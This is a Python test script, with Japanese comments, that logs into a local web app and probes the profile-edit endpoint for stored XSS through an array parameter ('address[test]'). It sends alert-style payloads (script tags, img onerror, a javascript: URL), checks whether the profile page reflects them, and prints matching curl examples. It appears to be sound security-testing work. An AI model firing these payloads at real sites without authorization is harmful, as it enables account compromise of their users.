import requests
import urllib.parse

def test_address_array_xss():
    """プロフィール編集でのaddress配列パラメーターXSSテスト"""
    
    base_url = "http://localhost:5000"
    
    # まずログイン
    login_data = {
        'username': 'test1001',
        'password': 'password123'
    }
    
    session = requests.Session()
    
    print("=== プロフィール編集 配列パラメーターXSSテスト ===\n")
    
    try:
        # ログイン
        login_response = session.post(f"{base_url}/login", data=login_data)
        print(f"ログイン: {login_response.status_code}")
        
        if login_response.status_code != 200:
            print("❌ ログインに失敗しました")
            return
        
        # XSSペイロードのテスト
        xss_payloads = [
            "alert(1)",
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('XSS')",
            "'\"><script>alert(document.domain)</script>",
        ]
        
        for i, payload in enumerate(xss_payloads, 1):
            print(f"[テスト {i}] ペイロード: {payload}")
            
            # プロフィール編集データ
            profile_data = {
                'email': 'test@example.com',
                'address': '東京都',
                'phone': '090-1234-5678',
                'address[test]': payload  # 配列パラメーター
            }
            
            # プロフィール更新
            edit_response = session.post(f"{base_url}/user/profile/edit", data=profile_data)
            print(f"   プロフィール更新: {edit_response.status_code}")
            
            # プロフィール表示でXSS確認
            profile_response = session.get(f"{base_url}/user/profile")
            print(f"   プロフィール表示: {profile_response.status_code}")
            
            # XSSペイロードが反射されているかチェック
            if payload in profile_response.text:
                print("   🔴 XSS VULNERABLE - ペイロードが反射されています")
                
                # デバッグ情報の位置を確認
                if "Debug Info:" in profile_response.text:
                    print("   ✅ デバッグ情報が表示されています")
                    
                    # HTMLの中でどのように表示されているかチェック
                    lines = profile_response.text.split('\n')
                    for line_num, line in enumerate(lines):
                        if payload in line:
                            print(f"   📍 反射位置: {line.strip()}")
                            break
                            
            else:
                print("   🟢 フィルターされています")
            
            print()
    
    except requests.exceptions.RequestException as e:
        print(f"❌ リクエストエラー: {e}")

def show_example_requests():
    """テスト用のHTTPリクエスト例を表示"""
    
    print("=== テスト用HTTPリクエスト例 ===\n")
    
    curl_examples = [
        '''
# 基本的なXSSテスト
curl -X POST "http://localhost:5000/user/profile/edit" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "email=test@example.com&address=Tokyo&phone=090-1234-5678&address[test]=<script>alert(1)</script>" \\
  -b "session=your_session_cookie"
        ''',
        '''
# img tagによるXSS
curl -X POST "http://localhost:5000/user/profile/edit" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "email=test@example.com&address=Tokyo&phone=090-1234-5678&address[xss]=<img src=x onerror=alert(1)>" \\
  -b "session=your_session_cookie"
        ''',
        '''
# 複数の配列パラメーター
curl -X POST "http://localhost:5000/user/profile/edit" \\
  -H "Content-Type: application/x-www-form-urlencoded" \\
  -d "email=test@example.com&address=Tokyo&phone=090-1234-5678&address[payload1]=<script>alert('XSS1')</script>&address[payload2]=<img src=x onerror=alert('XSS2')>" \\
  -b "session=your_session_cookie"
        '''
    ]
    
    for i, example in enumerate(curl_examples, 1):
        print(f"[例 {i}]{example}")

if __name__ == "__main__":
    print("サーバーが http://localhost:5000 で起動していることを確認してください。")
    print("test1001/password123 でログイン可能であることを確認してください。\n")
    
    test_address_array_xss()
    print("\n" + "="*60 + "\n")
    show_example_requests()